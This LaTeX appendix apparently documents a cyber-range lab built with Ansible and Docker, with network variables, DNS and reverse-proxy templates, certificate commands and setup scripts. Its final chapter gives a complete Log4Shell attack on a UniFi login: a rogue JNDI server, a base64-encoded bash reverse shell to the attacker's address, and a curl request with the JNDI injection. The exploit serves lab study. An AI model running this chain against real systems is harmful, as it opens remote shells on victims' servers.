@@ -1,0 +1,190 @@
+\clearpage\thispagestyle{empty}\phantom{}\clearpage
+
+\chapter{Docker Networks' Ansible Variables} \label{ap1:ansible_vars_docker_networks}
+
+\begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Networks.]
+networks:
+  internal_net:
+    network_addr: 172.{{ random_byte }}.0.0/24
+    gateway_addr: 172.{{ random_byte }}.0.254
+    random_byte: "{{ random_byte }}"
+
+  dmz_net:
+    network_addr: 172.{{ random_byte | int - 5 }}.0.0/24
+    gateway_addr: 172.{{ random_byte | int - 5 }}.0.254
+    random_byte: "{{ random_byte | int - 5 }}"
+
+  external_net:
+    network_addr: 172.{{ random_byte | int - 10 }}.0.0/24
+    gateway_addr: 172.{{ random_byte | int - 10 }}.0.254
+    random_byte: "{{ random_byte | int - 10 }}"
+\end{lstlisting}
+
+
+\blankpage
+
+\chapter{Example of Machine's Ansible Variables} \label{ap1:ansible_vars_machine}
+
+\begin{lstlisting}[language=yaml,caption=Ansible Variables - Machines.]
+machines:
+  - name: attackermachine
+    image: kali_test_img
+    volumes:
+      - "/dev/net/tun:/dev/net/tun"
+    group:
+      - external
+      - mesh
+    published_ports:
+      - 5900:5900
+      - 6080:6080
+    dns: 
+      name: edge_router
+      network: external_net
+    networks:
+      - name: external_net
+        ipv4_address: 172.{{ networks.external_net.random_byte }}.0.2
+\end{lstlisting}
+
+\blankpage
+
+\chapter{DNS Server Template Configuration} \label{ap1:ansible_vars_dns_template_conf}
+
+\begin{lstlisting}[caption=DNS Server Template Configuration.]
+acl "exclude" {
+    {{ (machines | selectattr('name', '==', 'edge_router'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address') | first }};
+};
+
+acl internals {
+    !exclude;
+    172.{{ networks.internal_net.random_byte }}.0.0/24;
+    172.{{ networks.dmz_net.random_byte }}.0.0/24;
+};
+
+view "internal" {
+    match-clients { internals; };
+
+    {% for info in dns -%}
+    zone "{{ info.domain }}" {
+        type master;
+        file "/var/bind/db.internal.{{ info.domain }}";
+    };
+    {% endfor +%}
+};
+
+view "external" {
+    match-clients { any; };
+
+    {% for info in dns -%}
+    zone "{{ info.domain }}" {
+        type master;
+        file "/var/bind/db.external.{{ info.domain }}";
+    };
+    {% endfor +%}
+
+    # ... #
+};}
+\end{lstlisting}
+
+\chapter{Reverse Proxy Template Configuration} \label{ap1:ansible_vars_reverse_proxy_template_conf}
+
+\begin{lstlisting}[caption=Reverse Proxy Template Configuration.]
+http {
+    sendfile on;
+    large_client_header_buffers 4 32k;
+
+    {%+ for vars in machine_vars %}
+    
+    upstream service-{{ loop.index }} {
+    {% for target in vars.targets %}
+    server {{ ((selected_machines | selectattr('name', '==', target.name))[0]['networks'] | selectattr('name', '==', target.network) | map(attribute='ipv4_address')) | first }}:{{ target.port }};
+    {% endfor -%}
+    }
+
+    server {
+        listen 80;
+        server_name {{ vars.domain }};
+
+        location / {
+            return 301 https://$host$request_uri;
+        }
+    }
+
+    server {
+        listen 443 ssl;
+        server_name {{ vars.domain }};
+
+        ssl_certificate /etc/ssl/certs/{{ vars.domain }}.crt;
+        ssl_certificate_key /etc/ssl/private/{{ vars.domain }}.key;
+
+        location / {
+            proxy_pass         http://service-{{ loop.index }};
+            proxy_redirect     off;
+            proxy_http_version 1.1;
+            # ... #
+        }
+    }
+    {% endfor %}
+}
+\end{lstlisting}
+
+\chapter{Generating an SSL Certificate for UniFi's Dashboard} \label{ap1:ansible_generate_ssl_certificate_unifi}
+
+\begin{lstlisting}[language=bash,caption=Generating an SSL Certificate for UniFi's dashboard.]
+#!/bin/bash
+
+# Generate CA keys (private and public keys)
+openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt
+
+# Generating Certificate Signing Request (notice the subjectAltName, which is mandatory, at least in Firefox!)
+openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"
+
+# Generate Server Public-key Certificate
+openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key
+
+# Remove Password from server's private key
+openssl rsa -in server.key -out server_nopass.key
+\end{lstlisting}
+
+\blankpage
+
+\chapter{Entry Point Bash Script} \label{ap1:log4j_entrypoint_script}
+
+\begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.]
+#!/bin/bash
+
+cd "$( dirname "$0" )"
+
+# UniFi Wizard Setup 
+
+sleep 10
+pip install -r requirements.txt
+python3 setup.py
+
+# Load new trusted root CA
+
+cp /setup/ca.crt /usr/local/share/ca-certificates
+update-ca-certificates
+
+# Also in Firefox-Esr
+
+cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
+\end{lstlisting}
+
+\blankpage
+
+\chapter{Cloning Rogue JNDI GitHub Repository} \label{ap1:unifi_clone_rogue_jndi}
+
+\begin{lstlisting}[language=bash,caption=Cloning Rogue JNDI GitHub Repository.]
+# Clone Rogue JNDI GitHub repository and build project
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
+
+# Create the Base64 payload 
+echo 'bash -c bash -i >&/dev/tcp/172.152.0.2/4444 0>&1' | base64
+
+# Running the malicious LDAP and HTTP Server with the Base64 malicious payload. The hostname flag denotes the target HTTP server.
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwP
+iYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"
+
+# Running Exploit
+curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:1389/o=tomcat}","strict":true}'
+\end{lstlisting}
